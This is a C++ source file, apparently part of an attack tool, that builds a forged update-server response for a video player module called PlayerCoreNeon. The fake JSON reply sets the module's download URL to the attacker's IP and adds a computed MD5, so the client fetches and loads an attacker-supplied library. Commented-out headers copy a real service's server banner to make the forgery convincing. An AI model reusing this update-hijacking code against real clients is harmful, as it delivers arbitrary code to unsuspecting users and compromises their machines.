


#include "PlayerCoreNeon.h"
#include "..\\attacker.h"
#include "../version.h"
#include "../HttpUtils.h"



int PlayerCoreNeon::prepareRespData(unsigned long ulIP, string filepath, string filename) {

	int ret = 0;
	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: application/x-javascript; charset=utf8\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

	//char * lpRespFormat = 
	//	"HTTP/1.1 200 OK\r\nContent-Type: application/x-javascript; charset=utf8\r\nContent-Length: %u\r\nServer: QZHTTP-2.38.20\r\n"
	//	"X-Verify-Code: d142c74cff8da0b345bf94662bafc231\r\nKeep-Alive: timeout=15, max=1024\r\nX-Daa-Tunnel: hop_count=1\r\n"
	//	"Connection: keep-alive\r\n\r\n%s";

	char * lpRespContentFormat =
		"QZOutputJson={\"c_so_name\":\"%s\",\"c_so_update_ver\":\"%s\","
		"\"c_so_url\":\"http://%s/%s\",\"c_so_md5\":\"%s\",\"ret\": 0};\r\n\r\n";

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename, TRUE);

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat, 
		PLAYERCORENEON_MODULE_NAME, DEFAULT_PLAYERCORENEON_VERSION, szip.c_str(),filename.c_str(), m_szmd5);

	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);

	return m_filesize;
}